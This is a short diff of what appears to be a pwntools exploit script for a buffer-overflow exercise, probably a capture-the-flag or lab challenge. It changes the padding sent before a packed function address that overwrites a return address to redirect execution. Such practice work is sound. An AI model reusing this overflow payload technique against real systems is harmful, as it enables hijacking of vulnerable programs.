@@ -11,7 +11,7 @@ for line in lines:
   print(line.decode())
 # Figure out how far away it is, need that distance + 8
 # Create the right packed address
-bytes_to_send = b'00000000'*3 + p64(fun_addr, 'little')
+bytes_to_send = b'abcdefgh'*3 + p64(fun_addr, 'little')
 
 p.send(bytes_to_send)
 lines = p.readlines(2)
